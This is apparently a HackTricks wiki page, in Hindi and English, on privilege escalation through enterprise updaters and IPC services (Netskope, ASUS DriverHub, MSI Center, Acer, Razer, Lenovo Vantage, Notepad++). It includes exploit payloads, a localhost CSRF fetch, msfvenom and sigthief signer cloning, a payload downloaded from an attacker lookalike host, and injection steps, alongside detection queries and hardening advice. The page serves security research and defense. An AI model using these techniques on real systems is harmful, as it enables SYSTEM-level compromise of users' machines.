# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows local privilege escalation chains की एक class को generalize करता है जो enterprise endpoint agents और updaters में मिलती है, जो एक low-friction IPC surface और एक privileged update flow expose करते हैं। एक representative example है Windows < R129 के लिए Netskope Client (CVE-2025-0309), जहाँ एक low-privileged user attacker-controlled server में enrollment को force कर सकता है और फिर एक malicious MSI deliver कर सकता है जिसे SYSTEM service install करता है।

Key ideas जिन्हें आप similar products के खिलाफ reuse कर सकते हैं:
- privileged service के localhost IPC का abuse करके re-enrollment या reconfiguration को attacker server पर force करना।
- vendor के update endpoints implement करना, एक rogue Trusted Root CA deliver करना, और updater को एक malicious, “signed” package की ओर point करना।
- weak signer checks (CN allow-lists), optional digest flags, और lax MSI properties को evade करना।
- अगर IPC “encrypted” है, तो registry में stored world-readable machine identifiers से key/IV derive करना।
- अगर service callers को image path/process name के आधार पर restrict करता है, तो allow-listed process में inject करना या एक को suspended spawn करके minimal thread-context patch के जरिए अपना DLL bootstrap करना।

---
## 1) localhost IPC के जरिए enrollment को attacker server पर force करना

कई agents एक user-mode UI process के साथ आते हैं जो localhost TCP के जरिए JSON का उपयोग करते हुए एक SYSTEM service से बात करता है।

Netskope में observed:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) एक JWT enrollment token craft करें जिसके claims backend host को control करते हैं (e.g., AddonUrl)। alg=None का उपयोग करें ताकि signature की आवश्यकता न हो।
2) आपके JWT और tenant name के साथ provisioning command invoke करने वाला IPC message send करें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) सेवा enrollment/config के लिए आपके rogue server को hit करना शुरू करती है, उदाहरण के लिए:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- अगर caller verification path/name-based है, तो request को किसी allow-listed vendor binary से originate करें (देखें §4).

---
## 2) update channel को hijack करके code को SYSTEM के रूप में चलाना

एक बार client आपके server से बात करने लगे, expected endpoints implement करें और उसे attacker MSI की ओर steer करें। Typical sequence:

1) /v2/config/org/clientconfig → बहुत short updater interval के साथ JSON config return करें, उदाहरण के लिए:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA certificate लौटाएँ। service इसे Local Machine Trusted Root store में install करता है।
3) /v2/checkupdate → malicious MSI और fake version की ओर इशारा करने वाला metadata supply करें।

वाइल्ड में दिखने वाली common checks को bypass करना:
- Signer CN allow-list: service केवल Subject CN को “netSkope Inc” या “Netskope, Inc.” के बराबर ही check कर सकता है। आपका rogue CA उस CN वाला leaf issue कर सकता है और MSI को sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की एक benign MSI property शामिल करें। install पर enforcement नहीं।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) extra cryptographic validation को disable करता है।

Result: SYSTEM service आपका MSI से install करता है
C:\ProgramData\Netskope\stAgent\data\*.msi
और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute होता है।

Patch-bypass lesson: अगर कोई vendor update source को cryptographically authenticate करने के बजाय कुछ “trusted” domains को allow-list करके जवाब देता है, तो ऐसे vendor-owned redirectors या reverse proxies ढूँढें जो फिर भी आपको traffic steer करने दें। Netskope के मामले में, public follow-up research ने दिखाया कि R129-era allow-list को अभी भी `rproxy.goskope.com` के जरिए abuse किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। hostname allow-lists को trust boundary नहीं, बल्कि एक speed bump समझें।

---
## 3) Forging encrypted IPC requests (when present)

R127 से, Netskope ने IPC JSON को encryptData field में wrap किया जो Base64 जैसा दिखता है। reversing से पता चला कि AES key/IV registry values से derived थे जो किसी भी user द्वारा readable हैं:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption reproduce कर सकते हैं और standard user से valid encrypted commands भेज सकते हैं। General tip: अगर कोई agent अचानक अपना IPC “encrypt” करने लगे, तो material के रूप में HKLM के तहत device IDs, product GUIDs, install IDs देखें।

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

कुछ services peer को authenticate करने की कोशिश TCP connection के PID को resolve करके और image path/name को Program Files के तहत स्थित allow-listed vendor binaries (e.g., stagentui.exe, bwansvc.exe, epdlp.exe) से compare करके करती हैं।

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) और उसके अंदर से IPC proxy करना।
- CreateRemoteThread के बिना एक allow-listed binary को suspended spawn करना और आपके proxy DLL को bootstrap करना (see §5), ताकि driver-enforced tamper rules satisfy हों।

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से dangerous rights strip करने के लिए minifilter/OB callbacks driver (e.g., Stadrv) ship करते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक restrict करता है

इन constraints का सम्मान करने वाला reliable user-mode loader:
1) CREATE_SUSPENDED के साथ एक vendor binary का CreateProcess करें।
2) ऐसे handles प्राप्त करें जिनकी अभी भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या अगर आप known RIP पर code patch करते हैं तो सिर्फ THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed-mapped thunk) को एक tiny stub से overwrite करें जो आपके DLL path पर LoadLibraryW call करे, फिर वापस jump करे।
4) अपने stub को in-process trigger करने के लिए ResumeThread करें, और अपनी DLL load करें।

क्योंकि आपने पहले से-protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME कभी use नहीं किया (आपने उसे create किया), driver की policy satisfy हो जाती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing, और आवश्यक endpoints serve करने को automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope एक custom IPC client है जो arbitrary (optionally AES-encrypted) IPC messages craft करता है और allow-listed binary से originate करने के लिए suspended-process injection शामिल करता है।

## 7) Fast triage workflow for unknown updater/IPC surfaces

जब किसी नए endpoint agent या motherboard “helper” suite का सामना हो, तो एक quick workflow आमतौर पर यह बताने के लिए पर्याप्त होता है कि आप privesc target देख रहे हैं या नहीं:

1) loopback listeners enumerate करें और उन्हें vendor processes से map करें:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) उम्मीदवार named pipes enumerate करें:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-backed routing data को mine करें:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) सबसे पहले user-mode client से endpoint names, JSON keys, और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) वास्तविक trust predicate को खोजें, न कि सिर्फ उस code path को जो अंततः process launch करता है:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
प्राथमिकता देने लायक patterns:
- `CryptQueryObject`/certificate parsing बिना `WinVerifyTrust` आमतौर पर मतलब होता है “certificate मौजूद है” को “certificate trusted है” मान लिया गया, जिससे certificate cloning या दूसरे fake-signer tricks संभव हो जाते हैं।
- `Origin`, `Referer`, download URLs, process names, या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` अक्सर attacker-controlled lookalike domains से exploitable होता है।
- अगर low-privileged GUI “file trusted है” तय करती है और SYSTEM broker सिर्फ उस result को consume करता है, तो client-side DLL/JS को patch या reimplement करना अक्सर boundary को पूरी तरह bypass कर देता है (Razer-style split validation)।
- अगर broker `%TEMP%`/`C:\Windows\Temp` में payload copy करके फिर उसी path से validate या schedule करता है, तो तुरंत TOCTOU replacement windows और sibling plugin modules की जाँच करें जो weaker checks के साथ alternate `ExecuteTask()` wrappers expose करते हैं।

named-pipe-heavy targets के लिए, PipeViewer weak DACLs और remotely reachable pipes spot करने का एक तेज़ तरीका है, protocol को depth में reverse करने से पहले।

अगर target callers को केवल PID, image path, या process name से authenticate करता है, तो इसे boundary नहीं बल्कि speed bump मानें: legitimate client में inject करना, या allow-listed process से connection बनाना, अक्सर server की checks pass कराने के लिए काफी होता है। named pipes के लिए specifically, [client impersonation and pipe abuse](named-pipe-client-impersonation.md) वाली page इस primitive को ज्यादा depth में cover करती है।

---
## 8) Vendor signatures से केवल authenticated modular add-in brokers (Lenovo Vantage pattern)

Hunt करने लायक एक newer variation है **signed-client RPC broker**: एक low-privileged Lenovo-signed desktop process एक SYSTEM service से बात करता है, और service JSON commands को `%ProgramData%` के तहत XML-described add-ins की set में route करता है। जैसे ही code execution **किसी भी accepted signed client के अंदर** मिल जाता है, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर भरोसा क्योंकि वह vendor द्वारा signed है**: researchers ने एक Lenovo-signed EXE को writable directory में copy करके और एक DLL side-load (`profapi.dll`) satisfy करके authenticated context हासिल किया, ताकि arbitrary code उस client के अंदर चले जिस पर service पहले से भरोसा करता था।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के तहत declare होते हैं; कई contracts `SYSTEM` के रूप में run करते हैं, इसलिए उन manifests को enumerate करना अक्सर broker को reverse करने से पहले ही असली privileged verbs दिखा देता है।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में path-traversal + race conditions update/install verbs में, privileged settings databases में raw-SQL abuse, और substring-based registry path checks मिले, जिन्होंने intended hive के बाहर writes enable किए।

target पर useful recon:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
व्यावहारिक निष्कर्ष: जब भी कोई helper suite एक broker expose करती है जो पहले **caller process** को authenticate करता है और फिर दर्जनों plugin/add-in commands में dispatch करती है, तो front-door trust check bypass करने के बाद रुकें नहीं। manifest/contract table dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel आमतौर पर कई second-stage bugs छिपाता है।

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) ship करता है, जो https://driverhub.asus.com से आने वाले browser calls की अपेक्षा करता है। origin filter बस Origin header और `/asus/v1.0/*` द्वारा expose किए गए download URLs पर `string_contains(".asus.com")` perform करता है। इसलिए कोई भी attacker-controlled host जैसे `https://driverhub.asus.com.attacker.tld` check pass कर देता है और JavaScript से state-changing requests issue कर सकता है। अतिरिक्त bypass patterns के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

Practical flow:
1) एक domain register करें जो `.asus.com` embed करता हो और वहाँ एक malicious webpage host करें।
2) `fetch` या XHR का उपयोग करके `http://127.0.0.1:53000` पर एक privileged endpoint (जैसे, `Reboot`, `UpdateApp`) call करें।
3) Handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS नीचे दिया गया schema दिखाता है।
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
यहाँ नीचे दिखाया गया PowerShell CLI भी तब सफल हो जाता है जब Origin header को trusted value में spoof किया जाता है:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: जब “helper” suites को reverse करें, तो localhost TCP या named pipes पर ही मत रुकें। `Elevator`, `Launcher`, `Updater`, या `Utility` जैसे नामों वाली COM classes की जांच करें, फिर verify करें कि privileged service सच में target binary को validate करता है या सिर्फ patchable user-mode client DLL द्वारा compute किए गए result पर trust करता है। यह pattern Razer से आगे भी generalize होता है: कोई भी split design जहाँ high-privilege broker low-privilege side से आए allow/deny decision को consume करता है, privesc surface का candidate है।

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

June 2025 से December 2025 के बीच, जिन attackers ने Notepad++ update flow के पीछे की hosting infrastructure compromise की, उन्होंने चुनिंदा victims को malicious manifests selectively serve किए। पुराने WinGUp-based updaters update authenticity को पूरी तरह verify नहीं करते थे, इसलिए hostile XML response clients को attacker-controlled URLs की ओर redirect कर सकता था। क्योंकि client ने HTTPS content को accept किया लेकिन downloaded installer पर न तो trusted certificate chain और न ही valid PE signature enforce की, victims ने trojanized NSIS `update.exe` fetch और execute किया।

Operational flow (no local exploit required):
1. **Infrastructure interception**: CDN/hosting compromise करें और attacker metadata के साथ update checks का जवाब दें, जो malicious download URL की ओर point करे।
2. **Trojanized NSIS**: installer payload fetch/execute करता है और दो execution chains का abuse करता है:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe` bundle करें और इसकी search path में malicious `log.dll` drop करें। जब signed binary run होता है, Windows `log.dll` sideload करता है, जो Chrysalis backdoor को decrypt और reflectively load करता है (Warbird-protected + API hashing static detection को hinder करने के लिए)।
- **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है जो Win32 APIs (e.g., `EnumWindowStationsW`) का use करके shellcode inject करता है और Cobalt Strike Beacon stage करता है।

किसी भी auto-updater के लिए hardening/detection takeaways:
- Downloaded installer की **certificate + signature verification** enforce करें (vendor signer pin करें, mismatched CN/chain reject करें) और update manifest को खुद sign करें (e.g., XMLDSig)। जब तक validate न हो, manifest-controlled redirects block करें।
- **BYO signed binary sideloading** को post-download detection pivot की तरह treat करें: alert करें जब कोई signed vendor EXE अपनी canonical install path के बाहर से किसी DLL name को load करे (e.g., Bitdefender का `log.dll` को Temp/Downloads से load करना) और जब कोई updater temp से installers drop/execute करे जिनकी signatures non-vendor हों।
- इस chain में देखे गए **malware-specific artifacts** monitor करें (generic pivots के रूप में उपयोगी): mutex `Global\Jdhfv_1.0.1`, `%TEMP%` पर anomalous `gup.exe` writes, और Lua-driven shellcode injection stages।
- Notepad++ ने v8.8.9 और बाद में WinGUp को मजबूत करके जवाब दिया: returned XML अब signed है (XMLDSig), और newer builds transport alone पर trust करने के बजाय downloaded installer की certificate + signature verification enforce करते हैं।

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> गैर-Notepad++ installer को लॉन्च कर रहा है</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

ये पैटर्न किसी भी updater पर लागू होते हैं जो unsigned manifests स्वीकार करता है या installer signers को pin करने में विफल रहता है—network hijack + malicious installer + BYO-signed sideloading के जरिए “trusted” updates की आड़ में remote code execution मिलता है।

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
